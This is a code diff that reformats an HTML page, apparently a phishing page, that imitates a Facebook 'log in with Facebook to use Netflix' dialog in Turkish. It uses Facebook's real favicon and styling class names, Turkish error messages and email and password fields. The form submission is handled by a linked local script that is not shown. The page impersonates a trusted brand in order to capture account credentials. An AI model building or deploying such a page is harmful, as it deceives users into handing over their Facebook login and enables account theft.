@@ -1,82 +1,64 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link
-      rel="stylesheet"
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
-      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
-      crossorigin="anonymous"
-    />
-    <link rel="stylesheet" href="style/facebookStyle.css" />
-    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
-    <title>Netflix</title>
-  </head>
-  <body>
-    <div id="pageheader">
-      <div class="logo">
-        <h2 id="homelink">Facebook</h2>
-      </div>
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+    crossorigin="anonymous" />
+  <link rel="stylesheet" href="style/facebookStyle.css" />
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
+  <title>Netflix</title>
+</head>
+
+<body>
+  <div id="pageheader">
+    <div class="logo">
+      <h2 id="homelink">Facebook</h2>
     </div>
-    <div class="login_form_container">
-      <div id="content">
-        <span style="font-weight: 600">Netflix</span>
-        uygulamasını Facebook hesabınla kullanmak için giriş yap.
-      </div>
-      <div class="email-error" id="error-box" style="display: none;">
-        <h2 class="error-header" style="margin: 0;">Yanlış e-posta veya telefon numarası</h2>
-        <p style="margin: 0;">Girdiğin e-posta veya cep telefonu numarası bir hesaba bağlı değil. <a href="#">Hesabını bul ve giriş yap</a></p>
-      </div>
-      <div class="email-error" id="password-box" style="display: none;">
-        <h2 class="error-header" style="margin: 0;">Lütfen şifreni tekrar gir</h2>
-        <p style="margin: 0;">Girdiğin şifre yanlış. <a href="#">Şifreni mi Unuttun?</a></p>
-      </div>
-      <form>
-        <div id="loginform">
-          <div class="clearfix form_row">
-            <label class="login_form_label">E-posta veya Telefon:</label>
-            <input
-              type="text"
-              name="email"
-              id="email"
-              tabindex="0"
-              autocomplete="username"
-              class="inputtext _55r1"
-              autofocus
-            />
-          </div>
-          <div class="clearfix form_row">
-            <label class="login_form_label">Şifre:</label>
-            <input
-              type="password"
-              name="pass"
-              id="pass"
-              tabindex="0"
-              value=""
-              autocomplete="current-password"
-              class="inputtext _55r1"
-            />
-          </div>
-          <div id="buttons" class="form_row clearfix">
-            <label class="uiButton uiButtonConfirm uiButtonLarge">
-              <input
-                value="Giriş Yap"
-                name="login"
-                type="submit"
-                tabindex="0"
-                id="login-facebook"
-              />
-            </label>
-          </div>
-          <p class="reset_password form_row"><a href="#">Hesabını mı unuttun?</p>
-          <div style="margin:auto; width:380px">
-            <a role="button" class="_42ft _4jy0 _4jy3 _4jy2 selected _51sy" style="margin-left:100px" href="#">Yeni Hesap Oluştur</a>
-          </div>
+  </div>
+  <div class="login_form_container">
+    <div id="content">
+      <span style="font-weight: 600">Netflix</span>
+      uygulamasını Facebook hesabınla kullanmak için giriş yap.
+    </div>
+    <div class="email-error" id="error-box" style="display: none;">
+      <h2 class="error-header" style="margin: 0;">Yanlış e-posta veya telefon numarası</h2>
+      <p style="margin: 0;">Girdiğin e-posta veya cep telefonu numarası bir hesaba bağlı değil. <a href="#">Hesabını bul
+          ve giriş yap</a></p>
+    </div>
+    <div class="email-error" id="password-box" style="display: none;">
+      <h2 class="error-header" style="margin: 0;">Lütfen şifreni tekrar gir</h2>
+      <p style="margin: 0;">Girdiğin şifre yanlış. <a href="#">Şifreni mi Unuttun?</a></p>
+    </div>
+    <form>
+      <div id="loginform">
+        <div class="clearfix form_row">
+          <label class="login_form_label">E-posta veya Telefon:</label>
+          <input type="text" name="email" id="email" tabindex="0" autocomplete="username" class="inputtext _55r1"
+            autofocus />
         </div>
-      </form>
-    </div>
-    <script src="js/facebookscript.js"></script>
-  </body>
+        <div class="clearfix form_row">
+          <label class="login_form_label">Şifre:</label>
+          <input type="password" name="pass" id="pass" tabindex="0" value="" autocomplete="current-password"
+            class="inputtext _55r1" />
+        </div>
+        <div id="buttons" class="form_row clearfix">
+          <label class="uiButton uiButtonConfirm uiButtonLarge">
+            <input value="Giriş Yap" name="login" type="submit" tabindex="0" id="login-facebook" />
+          </label>
+        </div>
+        <p class="reset_password form_row"><a href="#">Hesabını mı unuttun?</p>
+        <div style="margin:auto; width:380px">
+          <a role="button" class="_42ft _4jy0 _4jy3 _4jy2 selected _51sy" style="margin-left:100px" href="#">Yeni Hesap
+            Oluştur</a>
+        </div>
+      </div>
+    </form>
+  </div>
+  <script src="js/facebookscript.js"></script>
+</body>
+
 </html>
